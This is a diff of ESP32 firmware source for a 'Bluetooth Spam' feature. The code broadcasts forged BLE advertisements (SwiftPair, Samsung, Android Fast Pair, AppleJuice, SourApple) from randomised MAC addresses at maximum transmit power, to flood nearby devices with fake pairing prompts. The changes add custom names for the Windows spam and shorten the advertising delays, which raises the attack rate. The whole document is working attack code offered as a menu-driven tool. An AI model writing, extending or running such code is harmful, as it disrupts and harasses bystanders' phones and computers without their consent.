@@ -10,9 +10,11 @@
 #include "esp_gap_ble_api.h"
 #endif
 #include <globals.h>
-#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
+#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
+    defined(CONFIG_IDF_TARGET_ESP32S3)
 #define MAX_TX_POWER ESP_PWR_LVL_P21
-#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32C5)
+#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) ||                            \
+    defined(CONFIG_IDF_TARGET_ESP32C5)
 #define MAX_TX_POWER ESP_PWR_LVL_P20
 #else
 #define MAX_TX_POWER ESP_PWR_LVL_P9
@@ -77,14 +79,9 @@ const DeviceType android_models[] = {
     {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
 };
 
-const WatchModel watch_models[26] = {
-    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04},
-    {0x05}, {0x06}, {0x07}, {0x08}, {0x09},
-    {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12},
-    {0x13}, {0x14}, {0x15}, {0x16}, {0x17},
-    {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E},
-    {0x20}
-};
+const WatchModel watch_models[26] = {{0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
+                                     {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15},
+                                     {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}};
 
 char randomNameBuffer[32];
 
@@ -108,15 +105,24 @@ int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
 
 BLEAdvertising *pAdvertising;
 
-BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
+BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String customName = "") {
     BLEAdvertisementData AdvData = BLEAdvertisementData();
     uint8_t *AdvData_Raw = nullptr;
     uint8_t i = 0;
 
     switch (Type) {
         case Microsoft: {
-            const char *Name = generateRandomName();
-            uint8_t name_len = strlen(Name);
+            const char *Name;
+            uint8_t name_len;
+
+            if (customName.length() > 0) {
+                Name = customName.c_str();
+                name_len = customName.length();
+            } else {
+                Name = generateRandomName();
+                name_len = strlen(Name);
+            }
+
             AdvData_Raw = new uint8_t[7 + name_len];
             AdvData_Raw[i++] = 6 + name_len;
             AdvData_Raw[i++] = 0xFF;
@@ -236,17 +242,16 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
     return AdvData;
 }
 
-void executeSpam(EBLEPayloadType type) {
-    
+void executeSpam(EBLEPayloadType type, String customName = "") {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
 
     BLEDevice::init("");
-    vTaskDelay(50 / portTICK_PERIOD_MS);
+    vTaskDelay(5 / portTICK_PERIOD_MS);
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
     pAdvertising = BLEDevice::getAdvertising();
-    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
+    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type, customName);
     BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
 
     advertisementData.setFlags(0x06);
@@ -256,10 +261,10 @@ void executeSpam(EBLEPayloadType type) {
     pAdvertising->setMinInterval(32);
     pAdvertising->setMaxInterval(48);
     pAdvertising->start();
-    vTaskDelay(250 / portTICK_PERIOD_MS);
+    vTaskDelay(20 / portTICK_PERIOD_MS);
 
     pAdvertising->stop();
-    vTaskDelay(50 / portTICK_PERIOD_MS);
+    vTaskDelay(5 / portTICK_PERIOD_MS);
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
@@ -274,13 +279,9 @@ void executeCustomSpam(String spamName) {
     esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
 
     BLEDevice::init("sh4rk");
-
     vTaskDelay(5 / portTICK_PERIOD_MS);
-
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-
     pAdvertising = BLEDevice::getAdvertising();
-
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
 
     advertisementData.setFlags(0x06);
@@ -290,7 +291,7 @@ void executeCustomSpam(String spamName) {
     pAdvertising->start();
     vTaskDelay(20 / portTICK_PERIOD_MS);
     pAdvertising->stop();
-    vTaskDelay(10 / portTICK_PERIOD_MS);
+    vTaskDelay(5 / portTICK_PERIOD_MS);
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
@@ -331,7 +332,7 @@ void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId
         Serial.println("Advertizing started...");
         vTaskDelay(20 / portTICK_PERIOD_MS);
         pAdvertising->stop();
-        vTaskDelay(10 / portTICK_PERIOD_MS);
+        vTaskDelay(5 / portTICK_PERIOD_MS);
         Serial.println("Advertizing stop");
     }
 
@@ -345,21 +346,26 @@ void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId
 void aj_adv(int ble_choice) {
     int count = 0;
     String spamName = "";
-    if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }
-    
+    if (ble_choice == 6) { spamName = keyboard("", 24, "Name to spam"); }
+
+    if (ble_choice == 2) {
+        spamName = keyboard("", 24, "Windows Name to spam");
+        if (spamName == "\x1B") return;
+    }
+
     if (ble_choice == 5) {
         displayTextLine("Spam All Sequential");
         padprintln("");
         padprintln("Press ESC to stop");
-        
+
         while (1) {
             if (check(EscPress)) {
                 returnToMenu = true;
                 break;
             }
-            
+
             int protocol = count % 7;
-            
+
             switch(protocol) {
                 case 0:
                     displayTextLine("Android " + String(count));
@@ -390,15 +396,15 @@ void aj_adv(int ble_choice) {
                     executeSpam(AppleJuice);
                     break;
             }
-            
+
             count++;
-            
+
             if (check(EscPress)) {
                 returnToMenu = true;
                 break;
             }
         }
-        
+
         BLEDevice::init("");
         vTaskDelay(100 / portTICK_PERIOD_MS);
         pAdvertising = nullptr;
@@ -410,7 +416,7 @@ void aj_adv(int ble_choice) {
 #endif
         return;
     }
-    
+
     while (1) {
         switch (ble_choice) {
             case 0:
@@ -421,7 +427,7 @@ void aj_adv(int ble_choice) {
                 return;
             case 2:
                 displayTextLine("SwiftPair  (" + String(count) + ")");
-                executeSpam(Microsoft);
+                executeSpam(Microsoft, spamName);
                 break;
             case 3:
                 displayTextLine("Samsung  (" + String(count) + ")");
@@ -464,18 +470,14 @@ void aj_adv(int ble_choice) {
 
 void legacySubMenu() {
     std::vector<Option> legacyOptions;
-    
     legacyOptions.push_back({"SourApple", []() { aj_adv(7); }});
     legacyOptions.push_back({"AppleJuice", []() { aj_adv(8); }});
-    
-    
     legacyOptions.push_back({"Back", []() { returnToMenu = true; }});
-    
     loopOptions(legacyOptions, MENU_TYPE_SUBMENU, "Apple Spam (Legacy)");
 }
+
 void spamMenu() {
     std::vector<Option> options;
-
     options.push_back({"Apple Spam", [=]() { appleSubMenu(); }});
     options.push_back({"Apple Spam (Legacy)", [=]() { legacySubMenu(); }});
     options.push_back({"Windows Spam", lambdaHelper(aj_adv, 2)});
@@ -484,6 +486,5 @@ void spamMenu() {
     options.push_back({"Spam All", lambdaHelper(aj_adv, 5)});
     options.push_back({"Spam Custom", lambdaHelper(aj_adv, 6)});
     options.push_back({"Back", []() { returnToMenu = true; }});
-     
     loopOptions(options, MENU_TYPE_SUBMENU, "Bluetooth Spam");
 }
